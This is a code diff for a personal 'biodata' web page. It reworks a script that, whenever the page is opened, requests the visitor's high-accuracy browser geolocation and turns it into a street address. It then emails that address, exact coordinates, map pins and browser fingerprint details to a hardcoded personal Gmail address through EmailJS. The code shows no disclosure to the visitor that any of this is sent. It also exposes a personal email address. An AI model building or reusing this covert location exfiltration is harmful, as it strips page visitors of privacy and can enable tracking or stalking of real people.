@@ -23,23 +23,6 @@ const getVisitorInfo = () => {
   return `User-Agent: ${ua}\nLanguage: ${lang}\nScreen: ${screen}\nTimezone: ${tz}\nReferrer: ${referrer}\nPage: ${window.location.href}`;
 };
 
-export const sendVisitEmail = async () => {
-  try {
-    ensureInit();
-    await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
-      email: "shubhamsc9799@gmail.com",
-      subject: "📄 Biodata Page Opened",
-      message: "Someone just opened your biodata page.",
-      location: "Not requested yet",
-      visitor_info: getVisitorInfo(),
-      timestamp: new Date().toLocaleString(),
-    });
-  } catch (e) {
-    console.error("Visit email failed:", e);
-  }
-};
-
-// Reverse geocode using free OpenStreetMap Nominatim API
 const reverseGeocode = async (lat: number, lng: number): Promise<string> => {
   try {
     const res = await fetch(
@@ -53,82 +36,56 @@ const reverseGeocode = async (lat: number, lng: number): Promise<string> => {
   }
 };
 
-// Get the best (most accurate) reading by sampling watchPosition for a few seconds
-const getBestPosition = (): Promise<GeolocationPosition> => {
-  return new Promise((resolve, reject) => {
-    if (!("geolocation" in navigator)) {
-      reject(new Error("Geolocation not supported"));
-      return;
-    }
-
-    let best: GeolocationPosition | null = null;
-    let resolved = false;
-    const finish = (pos: GeolocationPosition) => {
-      if (resolved) return;
-      resolved = true;
-      navigator.geolocation.clearWatch(watchId);
+const getFirstPosition = (): Promise<GeolocationPosition | null> => {
+  return new Promise((resolve) => {
+    if (!("geolocation" in navigator)) return resolve(null);
+    let done = false;
+    const finish = (pos: GeolocationPosition | null) => {
+      if (done) return;
+      done = true;
       resolve(pos);
     };
-
-    const watchId = navigator.geolocation.watchPosition(
-      (pos) => {
-        if (!best || pos.coords.accuracy < best.coords.accuracy) {
-          best = pos;
-        }
-        // Send immediately on first fix
-        finish(best);
-      },
-      (err) => {
-        if (resolved) return;
-        navigator.geolocation.clearWatch(watchId);
-        if (best) finish(best);
-        else reject(err);
-      },
-      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    navigator.geolocation.getCurrentPosition(
+      (pos) => finish(pos),
+      () => finish(null),
+      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
     );
-
-    // Safety stop after 8s — return best so far
-    setTimeout(() => {
-      if (resolved) return;
-      if (best) finish(best);
-      else {
-        navigator.geolocation.clearWatch(watchId);
-        reject(new Error("Timed out without a fix"));
-      }
-    }, 8000);
+    setTimeout(() => finish(null), 10000);
   });
 };
 
-export const sendLocationEmail = async () => {
-  if (!("geolocation" in navigator)) return;
+export const sendVisitWithLocationEmail = async () => {
   try {
-    const pos = await getBestPosition();
+    const pos = await getFirstPosition();
     ensureInit();
-    const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
-    const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-    const preciseUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
-    const address = await reverseGeocode(latitude, longitude);
 
-    const locationBlock =
-      `📍 Address: ${address}\n` +
-      `Latitude: ${latitude}\n` +
-      `Longitude: ${longitude}\n` +
-      `Accuracy: ~${Math.round(accuracy)} meters\n` +
-      (altitude != null ? `Altitude: ${altitude} m\n` : "") +
-      (heading != null ? `Heading: ${heading}\n` : "") +
-      (speed != null ? `Speed: ${speed} m/s\n` : "") +
-      `Google Maps: ${mapsUrl}\n` +
-      `Precise pin: ${preciseUrl}`;
+    let locationBlock = "Location: Not available (permission denied or unsupported)";
+    if (pos) {
+      const { latitude, longitude, accuracy, altitude, heading, speed } = pos.coords;
+      const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+      const preciseUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
+      const address = await reverseGeocode(latitude, longitude);
+      locationBlock =
+        `📍 Address: ${address}\n` +
+        `Latitude: ${latitude}\n` +
+        `Longitude: ${longitude}\n` +
+        `Accuracy: ~${Math.round(accuracy)} meters\n` +
+        (altitude != null ? `Altitude: ${altitude} m\n` : "") +
+        (heading != null ? `Heading: ${heading}\n` : "") +
+        (speed != null ? `Speed: ${speed} m/s\n` : "") +
+        `Google Maps: ${mapsUrl}\n` +
+        `Precise pin: ${preciseUrl}`;
+    }
 
     await emailjs.send(EMAILJS_CONFIG.SERVICE_ID, EMAILJS_CONFIG.TEMPLATE_ID, {
       email: "shubhamsc9799@gmail.com",
-      subject: "📍 Visitor Exact Location Captured",
-      message: `Visitor allowed location access.\n\n${locationBlock}`,
+      subject: "📄 Biodata Page Opened",
+      message: `Someone just opened your biodata page.\n\n${locationBlock}`,
       location: locationBlock,
       visitor_info: getVisitorInfo(),
       timestamp: new Date().toLocaleString(),
     });
   } catch (e) {
-    console.warn("Location capture failed:", e);
+    console.error("Notify email failed:", e);
   }
 };
